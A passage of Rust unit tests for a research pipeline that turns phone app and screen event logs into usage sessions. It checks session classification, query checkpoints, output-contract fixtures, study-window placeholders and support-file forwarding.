        set(&mut row, APP_USAGE, Some(0.0));
        assert!(!is_credit_session(&row));
        set(&mut row, APP_USAGE, Some(-1.0));
        assert!(!is_credit_session(&row));
        set(&mut row, APP_USAGE, None);
        assert!(!is_credit_session(&row));

        // Screen rows and raw interaction rows travel through the credit layer
        // untouched; only the reconstructed App Usage episodes are candidates.
        set(&mut row, SCREEN_USAGE, Some(1.5));
        assert!(!is_credit_session(&row));
        set(&mut row, "Activity Resumed", Some(1.5));
        assert!(!is_credit_session(&row));
    }

    #[test]
    fn screen_credit_lineage_separates_direct_state_from_liveness_search() {
        let mut substrate = ScreenCreditSubstrate::default();
        substrate.source_events.insert(
            "P01".into(),
            vec![
                (0, SourceDataRows::single(1)),
                (100, SourceDataRows::single(2)),
                (140, SourceDataRows::single(5)),
                (155, SourceDataRows::single(3)),
                (500, SourceDataRows::single(4)),
            ],
        );
        substrate.points.insert(
            "P01".into(),
            vec![ScreenChangePoint {
                timestamp_ns: 100,
                state: ScreenCreditState::On,
                source_data_rows: SourceDataRows::single(2),
            }],
        );
        let events = substrate.source_events.get("P01").unwrap();
        let mut suffix_digests = vec![String::new(); events.len() + 1];
        suffix_digests[events.len()] = empty_lineage_search_suffix_digest(events.len() as u32);
        for index in (0..events.len()).rev() {
            suffix_digests[index] = screen_source_event_suffix_digest(
                events[index].0,
                &events[index].1,
                index,
                &suffix_digests[index + 1],
            );
        }
        substrate
            .source_event_suffix_digests
            .insert("P01".into(), suffix_digests);

        let (contributors, search) = credit_lineage_contributors(&substrate, "P01", 150, 160, 10);
        assert_eq!(contributors.to_vec(), vec![2]);
        let search = search.expect("liveness window must be recorded");
        assert_eq!(
            search.index_space.as_str(),
            "participant-source-event-order"
        );
        assert_eq!(
            (search.start_event_index, search.end_event_index_exclusive),
            (2, 4)
        );
        assert_eq!(search.candidate_event_count, 2);
        assert!(
            !contributors.contains(1),
            "unrelated historical prefixes must not expand"
        );
        assert!(
            !contributors.contains(4),
            "future events must not be attributed"
        );
    }

    #[test]
    fn inline_lineage_digests_are_byte_exact_with_the_v1_string_protocol() {
        let inline = [
            empty_inline_lineage_search_suffix_digest(0),
            empty_inline_lineage_search_suffix_digest(1),
        ];
        let strings = [
            empty_lineage_search_suffix_digest(0),
            empty_lineage_search_suffix_digest(1),
        ];
        for (compact, string) in inline.iter().zip(&strings) {
            assert_eq!(&compact.encoded(), string.as_bytes());
        }
        assert_eq!(
            inline_lineage_search_range_digest(&inline, 0, 1),
            lineage_search_range_digest(&strings, 0, 1),
        );
    }

    /// Explaining a screen-off by a nearby keyguard is a two-step search: first
    /// narrow to the keyguard events around the screen-off, then measure each
    /// one against the configured tolerance. Both edges of the window count as
    /// near — including a keyguard recorded just after the screen went off,
    /// which is the phone waking straight back into the lock screen. The
    /// narrowing rounds the tolerance up to whole nanoseconds, so it can hand
    /// back an event that is outside the tolerance, and the measurement is what
    /// actually decides.
    #[test]
    fn the_keyguard_near_stop_search_measures_every_event_it_narrows_to() {
        fn reasons(rows: &[Row], keyguard_near_stop_seconds: f64) -> Vec<String> {
            let closes = incremental::infer_screen_session_skeletons(rows);
            let keyguard = incremental::index_keyguard_events(rows);
            incremental::classify_screen_sessions(
                rows,
                &closes,
                &keyguard,
                &HashMap::new(),
                incremental::ScreenClassificationSettings {
                    auto_lock_timeout_seconds: 120.0,
                    auto_lock_tolerance_seconds: 30.0,
                    manual_lock_max_tail_seconds: 30.0,
                    keyguard_near_stop_seconds,
                    locked_screen_audio_disposition: LockedScreenAudioDisposition::Include,
                },
            )
            .iter()
            .map(|session| {
                session
                    .screen_usage_end_reason
                    .as_ref()
                    .map(|reason| reason.to_string())
                    .unwrap_or_default()
            })
            .collect()
        }

        // One screen session with a 200-second idle tail, ended by a keyguard
        // recorded an exact number of nanoseconds before the screen went off.
        let before = |offset_ns: i64, near_stop_seconds: f64| {
            let mut rows = rows_from_events(&[
                ("2026-03-07 10:00:00", "Screen Interactive", ""),
                (
                    "2026-03-07 10:00:01",
                    "Activity Resumed",
                    "com.example.chat",
                ),
                ("2026-03-07 10:03:20", "Keyguard Shown", ""),
                ("2026-03-07 10:03:21", "Screen Non-Interactive", ""),
            ]);
            let stop = rows[3].event_timestamp_ns;
            *rows[2].edit_temporal().event_timestamp_ns = stop - offset_ns;
            reasons(&rows, near_stop_seconds)
        };

        assert_eq!(
            before(2_000_000_000, 2.0),
            vec!["probable_manual_lock".to_string()],
            "a keyguard exactly one tolerance before the screen-off is near it",
        );
        assert_eq!(
            before(2_000_000_001, 2.0),
            vec!["extended_idle_or_unknown".to_string()],
            "one nanosecond further out is not",
        );
        assert_eq!(
            before(500_000_000, 2.0),
            vec!["probable_manual_lock".to_string()],
            "a fraction of a second before the screen-off is near it",
        );
        assert_eq!(
            before(100_000_001, 0.1),
            vec!["extended_idle_or_unknown".to_string()],
            "a tenth of a second plus a nanosecond is outside a tenth-second tolerance",
        );
        assert_eq!(
            before(100_000_000, 0.1),
            vec!["probable_manual_lock".to_string()],
            "exactly a tenth of a second is inside it",
        );

        // The search narrows to whole nanoseconds and rounds the bound up so
        // it can never drop a candidate, but the tolerance itself is exact:
        // an event inside the rounded-up window and outside the tolerance is
        // still not near the screen-off.
        assert_eq!(
            before(1, 1.5e-9),
            vec!["probable_manual_lock".to_string()],
            "one nanosecond is inside a one-and-a-half nanosecond tolerance",
        );
        assert_eq!(
            before(2, 1.5e-9),
            vec!["extended_idle_or_unknown".to_string()],
            "the nanosecond the search window rounds up to is outside it",
        );

        // The phone locked, then woke two seconds later straight into the lock
        // screen: the keyguard that explains the screen-off is recorded after
        // it, in the session that follows.
        let woke_back_up = rows_from_events(&[
            ("2026-03-07 10:00:00", "Screen Interactive", ""),
            ("2026-03-07 10:00:01", "Keyguard Shown", ""),
            (
                "2026-03-07 10:00:02",
                "Activity Resumed",
                "com.example.chat",
            ),
            ("2026-03-07 10:03:21", "Screen Non-Interactive", ""),
            ("2026-03-07 10:03:23", "Screen Interactive", ""),
            ("2026-03-07 10:03:23", "Keyguard Shown", ""),
        ]);
        assert_eq!(
            reasons(&woke_back_up, 2.0),
            vec![
                "probable_manual_lock".to_string(),
                "missing_stop".to_string(),
            ],
            "a keyguard two seconds after the screen-off still explains it",
        );
    }

    fn empty_query_recorder<'a>(
        digests: &'a mut BTreeMap<String, String>,
        checkpoints: &'a mut BTreeMap<String, WorkflowCheckpoint>,
    ) -> QueryCheckpointRecorder<'a> {
        QueryCheckpointRecorder {
            digests,
            checkpoints,
            remaining_queries: crate::workflow_contract::WORKFLOW_QUERIES.iter(),
            error: None,
            last_row_parts: None,
            last_row_checkpoint: None,
            last_canonical_order: None,
        }
    }

    /// Query checkpoints are the pipeline's claim about what it executed, so
    /// they are bound to the declared query sequence: each one has to be the next
    /// query the contract names, a query may not be recorded twice, and a run that
    /// stops early is reported rather than passed off as a complete set.
    #[test]
    fn the_query_recorder_binds_every_checkpoint_to_the_declared_query_sequence() {
        let record = |queries: &[&str]| {
            let mut digests = BTreeMap::new();
            let mut checkpoints = BTreeMap::new();
            let mut recorder = empty_query_recorder(&mut digests, &mut checkpoints);
            for query in queries {
                recorder.state(query, "state");
            }
            recorder.finish()
        };

        let declared = crate::workflow_contract::WORKFLOW_QUERIES
            .iter()
            .map(|query| query.id)
            .collect::<Vec<_>>();
        let total = declared.len();

        assert_eq!(record(&declared), Ok(()));
        assert_eq!(
            record(&[]),
            Err(
                "workflow query checkpoint sequence stopped before \"validate_remap_rules\""
                    .to_string()
            ),
        );
        assert_eq!(
            record(&declared[..1]),
            Err(format!(
                "workflow query checkpoint sequence stopped before {:?}",
                declared[1]
            )),
        );
        assert_eq!(
            record(&[declared[1], declared[0]]),
            Err(format!(
                "workflow query checkpoint order mismatch: expected {:?}, recorded {:?}",
                declared[0], declared[1],
            )),
        );
        let mut repeated = declared.clone();
        repeated.push(declared[total - 1]);
        assert_eq!(
            record(&repeated),
            Err(format!(
                "unexpected extra workflow query checkpoint {:?}",
                declared[total - 1],
            )),
        );
    }

    /// A query hands the next one the row components it just computed so the
    /// next checkpoint can reuse them instead of hashing the same table again.
    /// That offer is only good for the exact table it recorded: a different row
    /// count is a different table, and once the components are taken the offer
    /// is withdrawn.
    #[test]
    fn the_query_recorder_only_offers_row_components_for_the_table_it_recorded() {
        let rows = app_csv_rows();
        assert!(rows.len() > 1, "the fixture has a table to shorten");
        let first_query = crate::workflow_contract::WORKFLOW_QUERIES
            .first()
            .expect("workflow registry is non-empty")
            .id;

        let mut digests = BTreeMap::new();
        let mut checkpoints = BTreeMap::new();
        let mut recorder = empty_query_recorder(&mut digests, &mut checkpoints);
        assert!(recorder.last_row_parts().is_none());
        assert!(recorder.reusable_row_components(&rows).is_none());

        recorder.rows(first_query, &rows);
        assert_eq!(recorder.last_row_parts().map(<[_]>::len), Some(rows.len()));
        let (parts, checkpoint) = recorder
            .reusable_row_components(&rows)
            .expect("the table that was just recorded");
        assert_eq!(parts.len(), rows.len());
        assert_eq!(checkpoint.subject_id, first_query);
        assert!(
            recorder
                .reusable_row_components(&rows[..rows.len() - 1])
                .is_none(),
            "a shorter table is not the table that was recorded",
        );

        assert_eq!(
            recorder.take_last_row_parts().map(|parts| parts.len()),
            Some(rows.len()),
        );
        assert!(recorder.last_row_parts().is_none());
        assert!(recorder.reusable_row_components(&rows).is_none());
    }

    /// Supplying a canonical row order is a caller's claim that the order is
    /// already sorted by source identity, and the checkpoint trusts it instead
    /// of sorting again. A wrong claim would commit a membership digest for the
    /// wrong row sequence, so the claim is checked rather than assumed.
    #[cfg(debug_assertions)]
    #[test]
    #[should_panic(expected = "assertion failed")]
    fn a_supplied_canonical_row_order_that_is_not_sorted_is_refused() {
        let rows = app_csv_rows();
        let parts = row_checkpoint_parts_for_rows(&rows);
        let reversed = (0..rows.len()).rev().collect::<Vec<_>>();
        workflow_checkpoint_with_group_parts(
            "test_stage",
            &[("rows", &rows)],
            &[],
            Some(&[parts.as_slice()]),
            None,
            Some(&reversed),
        );
    }

    /// When the genre collapse consumes its source columns the export blanks
    /// them, so the classification checkpoint has to blank the same columns —
    /// otherwise two rows that export identically would commit different
    /// digests. A row whose columns were not consumed still commits them.
    #[test]
    fn the_classification_checkpoint_masks_exactly_the_consumed_genre_columns() {
        let classification = |value: Option<&str>, cleared: bool, slot: usize| {
            let mut row = app_csv_rows().remove(0);
            {
                let data = row.edit_all();
                let mut fields = vec![None; CODEBOOK_RENAME_PAIRS.len()];
                fields[slot] = value.map(str::to_owned);
                data.codebook_fields = Arc::new(fields);
                data.codebook_genre_fields_cleared = cleared;
            }
            let mut scratch = RowCheckpointScratch::default();
            row_checkpoint_parts(&row, &mut scratch).classification
        };

        let consumed = COLLAPSED_GENRE_FIELD_INDICES[0];
        let untouched = (0..CODEBOOK_RENAME_PAIRS.len())
            .find(|index| !COLLAPSED_GENRE_FIELD_INDICES.contains(index))
            .expect("a codebook column outside the genre collapse");

        assert_eq!(
            classification(Some("Social"), true, consumed),
            classification(None, true, consumed),
            "a consumed genre column is blank in the digest, as it is in the export",
        );
        assert_ne!(
            classification(Some("Social"), false, consumed),
            classification(None, false, consumed),
            "a genre column that was never consumed still commits its value",
        );
        assert_ne!(
            classification(Some("Social"), true, untouched),
            classification(None, true, untouched),
            "the collapse consumes only the genre columns",
        );
    }
}

/// Exact product-output contract for the fused cold-oracle pipeline.
///
/// The browser runtime hands these bytes to researchers unchanged, and the
/// step digests are the evidence a step may be reported as cached from, so
/// both are pinned byte-for-byte against checked-in expected files for one
/// fixture that reaches every option-gated stage.
///
/// Re-record deliberately, never to turn a red run green:
/// ```text
/// UPDATE_GOLDEN=1 cargo test --features incremental-v2 \
///   --manifest-path rust/chronicle_chrono_kernel_wasm/Cargo.toml \
///   output_contract
/// ```
#[cfg(test)]
mod output_contract {
    use super::*;

    // Every row reaches a specific option-gated stage:
    //   09:59 Screen Interactive / 10:10 Screen Non-Interactive -> screen session
    //   10:00-10:02 chat Resumed/Paused                         -> app session
    //   10:02 third event on a duplicate timestamp              -> nudge stage
    //   10:01-10:09:30 music, overlapping chat and video        -> concurrent split
    //   10:03-10:05 chat again (same package)                   -> switched_app 0
    //   10:06-10:09 video (different package)                   -> switched_app 1
    //   10:20 Screen Interactive + Keyguard Shown               -> screen classify
    //   11:30 Device Shutdown / 11:31 Device Startup            -> liveness break
    //   12:00-12:01 com.example.secret                          -> filter relabel
    //   13:00 video Resumed (closes the background span above)  -> background model
    //   14:00 news Resumed, 14:10 news Activity Stopped         -> stop fallback
    //   next day 09:00-09:30 chat                               -> two-day coverage
    // The chat label carries a comma and an embedded double quote, so the
    // emitted CSV must quote the field and double the inner quote.
    const FIXTURE_CSV: &str = concat!(
        "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
        "Study,P01,Target Child,,Screen Interactive,,2026-03-07 09:59:00,America/Chicago\n",
        "Study,P01,Target Child,\"Chat, \"\"Bot\"\"\",Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
        "Study,P01,Target Child,\"Chat, \"\"Bot\"\"\",Activity Paused,com.example.chat,2026-03-07 10:02:00,America/Chicago\n",
        "Study,P01,Target Child,\"Chat, \"\"Bot\"\"\",User Interaction,com.example.chat,2026-03-07 10:02:00,America/Chicago\n",
        "Study,P01,Target Child,Music,Activity Resumed,com.example.music,2026-03-07 10:01:00,America/Chicago\n",
        "Study,P01,Target Child,\"Chat, \"\"Bot\"\"\",Activity Resumed,com.example.chat,2026-03-07 10:03:00,America/Chicago\n",
        "Study,P01,Target Child,\"Chat, \"\"Bot\"\"\",Activity Paused,com.example.chat,2026-03-07 10:05:00,America/Chicago\n",
        "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 10:06:00,America/Chicago\n",
        "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 10:09:00,America/Chicago\n",
        "Study,P01,Target Child,Music,Activity Paused,com.example.music,2026-03-07 10:09:30,America/Chicago\n",
        "Study,P01,Target Child,,Screen Non-Interactive,,2026-03-07 10:10:00,America/Chicago\n",
        "Study,P01,Target Child,,Screen Interactive,,2026-03-07 10:20:00,America/Chicago\n",
        "Study,P01,Target Child,,Keyguard Shown,,2026-03-07 10:20:30,America/Chicago\n",
        "Study,P01,Target Child,,Screen Non-Interactive,,2026-03-07 10:21:00,America/Chicago\n",
        "Study,P01,Target Child,,Device Shutdown,,2026-03-07 11:30:00,America/Chicago\n",
        "Study,P01,Target Child,,Device Startup,,2026-03-07 11:31:00,America/Chicago\n",
        "Study,P01,Target Child,Secret,Activity Resumed,com.example.secret,2026-03-07 12:00:00,America/Chicago\n",
        "Study,P01,Target Child,Secret,Activity Paused,com.example.secret,2026-03-07 12:01:00,America/Chicago\n",
        "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 13:00:00,America/Chicago\n",
        "Study,P01,Target Child,Video,Activity Stopped,com.example.video,2026-03-07 13:05:00,America/Chicago\n",
        "Study,P01,Target Child,News,Activity Resumed,com.example.news,2026-03-07 14:00:00,America/Chicago\n",
        "Study,P01,Target Child,News,Activity Stopped,com.example.news,2026-03-07 14:10:00,America/Chicago\n",
        "Study,P01,Target Child,\"Chat, \"\"Bot\"\"\",Activity Resumed,com.example.chat,2026-03-08 09:00:00,America/Chicago\n",
        "Study,P01,Target Child,\"Chat, \"\"Bot\"\"\",Activity Paused,com.example.chat,2026-03-08 09:30:00,America/Chicago\n",
    );

    const FILTER_CSV: &[u8] =
        b"app_package_name,known_application_labels\ncom.example.secret,Secret\n";
    const APPS_FORCING_CSV: &[u8] = b"package_name,label_or_note\ncom.example.video,Video\n";
    const BACKGROUND_APPS_CSV: &[u8] = b"app_package_name\ncom.example.video\n";
    const CODEBOOK_CSV: &[u8] = concat!(
        "app_package_name,bcm_play_store_broad_app_category,genreId\n",
        "com.example.chat,Social,SOCIAL\n",
        "com.example.video,Entertainment,ENTERTAINMENT\n",
    )
    .as_bytes();
    const STUDY_DATES_CSV: &[u8] =
        b"participant_id,start_date,end_date\nP01,2026-03-07,2026-03-08\n";
    const DEVICE_SHARING_CSV: &[u8] = b"participant_id,sharing_status\nP01,Shared\n";
    const SURVEY_ATTRIBUTION_CSV: &[u8] = concat!(
        "participant_id,event_timestamp,users\n",
        "P01,2026-03-07 10:00:00,Target Child\n",
    )
    .as_bytes();
    const ENROLLED_DEVICES_CSV: &[u8] = b"participant_id,device_count\nP01,1\n";

    use crate::golden::assert_matches as assert_golden;

    fn contract_options() -> PipelineV2Options {
        PipelineV2Options {
            study_name: "Kernel Output Contract".into(),
            // On, matching the published default: the golden has to be the
            // table a researcher actually receives, not a narrower one.
            include_app_usage_end_reason: true,
            neutralize_spreadsheet_formulas: false,
            timezone: "America/Chicago".into(),
            timezone_handling: "selected-convert".into(),
            usage_session_mode: UsageSessionMode::AppAndScreenUsage,
            screen_session_construction_strategy: ScreenSessionConstructionStrategyId::default(),
            screen_session_construction_strategy_explicit: false,
            screen_session_classification_policy: ScreenSessionClassificationPolicy::None,
            screen_session_maximum_duration_minutes: 0.0,
            screen_session_maximum_duration_disposition:
                ScreenSessionMaximumDurationDisposition::None,
            locked_screen_audio_disposition: LockedScreenAudioDisposition::Include,
            episode_reconstruction_strategy: EpisodeReconstructionStrategy::FusedMatcher,
            opener_set: OpenerSet::StrategyDefined,
            interval_quality_policy: IntervalQualityPolicy::None,
            session_grouping_policy: SessionGroupingPolicy::None,
            session_gap_basis: SessionGapBasis::default(),
            session_boundary_scope: SessionBoundaryScope::default(),
            emit_session_break_lineage: false,
            event_retention_set: EventRetentionSet::None,
            maximum_duration: b06::MaximumDurationRequest::default(),
            include_app_output: true,
            include_screen_output: true,
            use_filter_file: true,
            use_apps_forcing_screen_open: true,
            use_background_apps_file: true,
            use_app_codebook: true,
            include_category_column: true,
            deduplicate_exact_rows: true,
            drop_out_of_source_order_events: false,
            interaction_type_remap: Vec::new(),
            correct_duplicate_event_timestamps: true,
            allow_stop_event_reuse: false,
            use_activity_stopped_as_fallback: true,
            apply_threshold_to_fallback: true,
            long_duration_threshold_ns: 21_600_000_000_000,
            proximity_interval_ns: 2_000_000_000,
            custom_app_engagement_duration: 300.0,
            long_data_time_gap_thresholds: vec![1.0, 6.0, 12.0],
            long_usage_duration_thresholds: vec![1.0, 6.0, 12.0],
            same_app_stop_types: vec!["Activity Paused".into(), "Activity Resumed".into()],
            other_stop_types: vec!["Activity Resumed".into(), "Device Shutdown".into()],
            interaction_types_to_remove: Vec::new(),
            interaction_type_removal_mode: InteractionTypeRemovalMode::GapPreserving,
            screen_auto_lock_timeout_seconds: 120.0,
            screen_auto_lock_tolerance_seconds: 30.0,
            screen_manual_lock_max_tail_seconds: 30.0,
            screen_keyguard_near_stop_seconds: 2.0,
            datetime_of_preprocessing: "2026-07-21 12:00:00 UTC".into(),
            model_concurrent_usage: true,
            micro_use_classification_policy: MicroUseClassificationPolicy::None,
            micro_use_classification_policy_explicit: false,
            minimum_usage_duration: 60.0,
            minimum_usage_duration_explicit: false,
            minimum_duration_comparator: MinimumDurationComparator::StrictLt,
            minimum_duration_comparator_explicit: false,
            minimum_duration_disposition: MinimumDurationDisposition::ChronicleBlankKeepRow,
            minimum_duration_disposition_explicit: false,
            apply_minimum_usage_duration_to_concurrent_subintervals: true,
            filter_zero_duration_sessions: true,
            add_no_activity_placeholder_days: true,
            enable_study_window_filter: true,
            enable_person_attribution: true,
            enable_day_coverage: true,
            enable_compliance_scoring: true,
            compliance_threshold_percent: 70.0,
            enable_screen_gated_crediting: true,
            enable_aggregates: true,
            aggregate_shape: "wide".into(),
            aggregate_top_apps_limit: 0,
            enable_participant_amount_summary: true,
            materialize_visualization_data: true,
            credited_session_cap_minutes: 360.0,
            device_liveness_gap_tolerance_minutes: 120.0,
            auto_lock_bridge_seconds: 120.0,
            bridge_screen_off_to_session_end: false,
            no_witness_min_day_apps: 2,
            screen_gating_rule: ScreenGatingRule::default(),
            day_boundary_attribution: DayBoundaryAttribution::default(),
            filter_match_field: FilterMatchField::AppPackageName,
            application_label_exclusions: Vec::new(),
            package_exclusion_preset: PackageExclusionPreset::AllSuppliedRows,
            notification_proxy_rule: NotificationProxyRule::None,
            polled_emulation_method: PolledEmulationMethod::None,
            polled_emulation_interval_seconds: 10.0,
            polled_emulation_gap_seconds: 15.0,
            interval_expansion_method: IntervalExpansionMethod::None,
        }
    }

    fn support_files() -> PipelineV2SupportFiles<'static> {
        PipelineV2SupportFiles {
            filter_csv: FILTER_CSV,
            apps_forcing_csv: APPS_FORCING_CSV,
            background_apps_csv: BACKGROUND_APPS_CSV,
            codebook_csv: CODEBOOK_CSV,
            study_dates_csv: STUDY_DATES_CSV,
            device_sharing_csv: DEVICE_SHARING_CSV,
            survey_attribution_csv: SURVEY_ATTRIBUTION_CSV,
            enrolled_devices_csv: ENROLLED_DEVICES_CSV,
            ..PipelineV2SupportFiles::default()
        }
    }

    fn run_contract_fixture() -> PipelineV2Result {
        run_pipeline_v2_with_supports(FIXTURE_CSV.as_bytes(), &contract_options(), support_files())
            .expect("the contract fixture must preprocess cleanly")
    }

    /// A package on both the filter list and the background list is published
    /// as Filtered App Background Usage with its real timing. Classification
    /// used to label it Filtered App Usage and blank its timing before the
    /// inclusion policy looked at the background list, so the label was never
    /// produced for a reconstructed episode and the row carried no times.
    #[test]
    fn a_filtered_background_app_keeps_its_timing_under_its_own_label() {
        let filter: &[u8] = b"app_package_name,known_application_labels\ncom.example.secret,Secret\ncom.example.video,Video\n";
        let result = run_pipeline_v2_with_supports(
            FIXTURE_CSV.as_bytes(),
            &contract_options(),
            PipelineV2SupportFiles {
                filter_csv: filter,
                ..support_files()
            },
        )
        .expect("the fixture preprocesses with the video app on both lists");
        let bytes = result.app_csv_bytes.to_vec();
        let mut reader = csv::Reader::from_reader(bytes.as_slice());
        let headers = reader.headers().expect("app csv header").clone();
        let column = |name: &str| {
            headers
                .iter()
                .position(|header| header == name)
                .unwrap_or_else(|| panic!("app csv has no {name} column"))
        };
        let (kind, package, start, stop) = (
            column("interaction_type"),
            column("app_package_name"),
            column("start_timestamp"),
            column("stop_timestamp"),
        );
        // Episode rows only: the raw Activity Stopped event of a filtered app
        // is published as Filtered App Stopped and never carries timing.
        let episodes: Vec<csv::StringRecord> = reader
            .records()
            .map(|record| record.expect("app csv row"))
            .filter(|record| {
                &record[package] == "com.example.video" && &record[kind] != "Filtered App Stopped"
            })
            .collect();
        assert!(!episodes.is_empty(), "the video episodes were dropped");
        for record in &episodes {
            assert_eq!(&record[kind], "Filtered App Background Usage");
            assert!(!record[start].is_empty(), "start timestamp was blanked");
            assert!(!record[stop].is_empty(), "stop timestamp was blanked");
        }
    }

    /// A raw day the study-window filter removed must not come back as a
    /// no-activity placeholder. Placeholder candidates come from the raw rows,
    /// which the filter never touches, so every out-of-window day with any raw
    /// event used to re-enter the app table as `com.placeholder.noactivity`.
    #[test]
    fn placeholder_days_respect_the_study_window() {
        let raw = format!(
            "{FIXTURE_CSV}{}",
            "Study,P01,Target Child,,Screen Interactive,,2026-03-10 09:00:00,America/Chicago\n",
        );
        let placeholder_dates = |options: &PipelineV2Options| -> Vec<String> {
            let result = run_pipeline_v2_with_supports(raw.as_bytes(), options, support_files())
                .expect("the fixture preprocesses with an out-of-window raw day");
            let bytes = result.app_csv_bytes.to_vec();
            let mut reader = csv::Reader::from_reader(bytes.as_slice());
            let headers = reader.headers().expect("app csv header").clone();
            let column = |name: &str| {
                headers
                    .iter()
                    .position(|header| header == name)
                    .unwrap_or_else(|| panic!("app csv has no {name} column"))
            };
            let (package, date) = (column("app_package_name"), column("date"));
            reader
                .records()
                .map(|record| record.expect("app csv row"))
                .filter(|record| &record[package] == "com.placeholder.noactivity")
                .map(|record| record[date].to_string())
                .collect()
        };
        let windowed = contract_options();
        assert!(windowed.enable_study_window_filter && windowed.add_no_activity_placeholder_days);
        assert!(
            !placeholder_dates(&windowed).contains(&"2026-03-10".to_string()),
            "an out-of-window day came back as a placeholder",
        );
        let mut unwindowed = contract_options();
        unwindowed.enable_study_window_filter = false;
        assert!(
            placeholder_dates(&unwindowed).contains(&"2026-03-10".to_string()),
            "without the window filter the raw-only day is a placeholder",
        );
    }

    /// The codebook alias columns are the derived category columns that stand
    /// in for a codebook join. Turning the codebook on without supplying a
    /// usable one still has to emit them: with nothing joined they are the only
    /// place a category can come from. Once a codebook actually carries rows,
    /// the joined columns take over and the aliases are dropped again unless
    /// the researcher asked for the category column outright.
    #[test]
    fn an_enabled_but_empty_codebook_still_emits_the_alias_columns() {
        // The narrow runner cannot accept the late analysis support roles, so
        // the stages needing them are off; the codebook role is what this test
        // moves.
        let mut options = contract_options();
        options.use_app_codebook = true;
        options.include_category_column = false;
        options.enable_study_window_filter = false;
        options.enable_person_attribution = false;
        options.enable_day_coverage = false;
        options.enable_compliance_scoring = false;
        options.add_no_activity_placeholder_days = false;
        let options = options;
        let none: &[u8] = b"";
        let usage_layer_active = options.model_concurrent_usage || options.use_background_apps_file;

        let header_of = |bytes: &[u8]| -> Vec<String> {
            String::from_utf8(bytes.to_vec())
                .expect("the app csv is utf-8")
                .lines()
                .next()
                .expect("the app csv has a header")
                .split(',')
                .map(str::to_string)
                .collect()
        };

        let without_codebook = run_pipeline_v2(FIXTURE_CSV.as_bytes(), &options, none, none, none)
            .expect("the fixture preprocesses with the codebook enabled and absent");
        assert_eq!(
            header_of(&without_codebook.app_csv_bytes.to_vec()),
            declared_app_output_columns(
                true,
                true,
                usage_layer_active,
                options.custom_app_engagement_duration,
                options.include_app_usage_end_reason,
                options.session_grouping_policy != SessionGroupingPolicy::None,
            ),
            "an enabled codebook with no rows to join dropped the alias columns",
        );

        let with_codebook =
            run_pipeline_v2(FIXTURE_CSV.as_bytes(), &options, none, none, CODEBOOK_CSV)
                .expect("the fixture preprocesses with a codebook");
        assert_eq!(
            header_of(&with_codebook.app_csv_bytes.to_vec()),
            declared_app_output_columns(
                true,
                false,
                usage_layer_active,
                options.custom_app_engagement_duration,
                options.include_app_usage_end_reason,
                options.session_grouping_policy != SessionGroupingPolicy::None,
            ),
            "a joined codebook still emitted the alias columns",
        );
    }

    /// `run_pipeline_v2` and `run_pipeline_v2_with_background` are the entry
    /// points callers reach for when they do not need every support role, and
    /// they exist only to forward their arguments into `PipelineV2SupportFiles`.
    /// A dropped field there is invisible — the call still succeeds and returns
    /// plausible output with a support file silently ignored — so every
    /// forwarded argument is checked by feeding it and observing the change.
    #[test]
    fn the_narrow_runners_forward_every_support_file_they_accept() {
        // The late analysis stages need support roles these runners cannot
        // accept, so they are off here; every role the runners *do* accept
        // stays on.
        let mut options = contract_options();
        options.enable_study_window_filter = false;
        options.enable_person_attribution = false;
        options.enable_day_coverage = false;
        options.enable_compliance_scoring = false;
        options.add_no_activity_placeholder_days = false;
        let options = options;
        let none: &[u8] = b"";

        let baseline = run_pipeline_v2(FIXTURE_CSV.as_bytes(), &options, none, none, none)
            .expect("the fixture preprocesses with no support files");
        for (name, filter, apps_forcing, codebook) in [
            ("filter_csv", FILTER_CSV, none, none),
            ("apps_forcing_csv", none, APPS_FORCING_CSV, none),
            ("codebook_csv", none, none, CODEBOOK_CSV),
        ] {
            let supplied = run_pipeline_v2(
                FIXTURE_CSV.as_bytes(),
                &options,
                filter,
                apps_forcing,
                codebook,
            )
            .expect("the fixture preprocesses with one support file");
            assert_ne!(
                (
                    supplied.app_csv_bytes.to_vec(),
                    supplied.screen_csv_bytes.to_vec()
                ),
                (
                    baseline.app_csv_bytes.to_vec(),
                    baseline.screen_csv_bytes.to_vec()
                ),
                "run_pipeline_v2 ignored {name}",
            );
        }

        let wide_baseline = run_pipeline_v2_with_background(
            FIXTURE_CSV.as_bytes(),
            &options,
            none,
            none,
            none,
            none,
        )
        .expect("the fixture preprocesses with no support files");
        assert_eq!(
            wide_baseline.app_csv_bytes, baseline.app_csv_bytes,
            "the two narrow runners disagree with no support files supplied"
        );
        for (name, filter, apps_forcing, background, codebook) in [
            ("filter_csv", FILTER_CSV, none, none, none),
            ("apps_forcing_csv", none, APPS_FORCING_CSV, none, none),
            ("background_apps_csv", none, none, BACKGROUND_APPS_CSV, none),
            ("codebook_csv", none, none, none, CODEBOOK_CSV),
        ] {
            let supplied = run_pipeline_v2_with_background(
                FIXTURE_CSV.as_bytes(),
                &options,
                filter,
                apps_forcing,
                background,
                codebook,
            )
            .expect("the fixture preprocesses with one support file");
            assert_ne!(
                (
                    supplied.app_csv_bytes.to_vec(),
                    supplied.screen_csv_bytes.to_vec()
                ),
                (
                    wide_baseline.app_csv_bytes.to_vec(),
                    wide_baseline.screen_csv_bytes.to_vec()
                ),
                "run_pipeline_v2_with_background ignored {name}",
            );
        }

        // The roles neither narrow runner accepts must stay at their defaults,
        // so a caller that used one of them cannot silently pick up study
        // windows, sharing status, survey attribution or device counts.
        let full = run_pipeline_v2_with_supports(
            FIXTURE_CSV.as_bytes(),
            &options,
            PipelineV2SupportFiles {
                filter_csv: FILTER_CSV,
                apps_forcing_csv: APPS_FORCING_CSV,
                background_apps_csv: BACKGROUND_APPS_CSV,
                codebook_csv: CODEBOOK_CSV,
                ..PipelineV2SupportFiles::default()
            },
        )
        .expect("the fixture preprocesses with the four narrow support files");
        let wide = run_pipeline_v2_with_background(
            FIXTURE_CSV.as_bytes(),
            &options,
            FILTER_CSV,
            APPS_FORCING_CSV,
            BACKGROUND_APPS_CSV,
            CODEBOOK_CSV,
        )
        .expect("the fixture preprocesses with the four narrow support files");
        assert_eq!(full.app_csv_bytes, wide.app_csv_bytes);
        assert_eq!(full.screen_csv_bytes, wide.screen_csv_bytes);
        assert_eq!(full.day_coverage_csv_bytes, wide.day_coverage_csv_bytes);
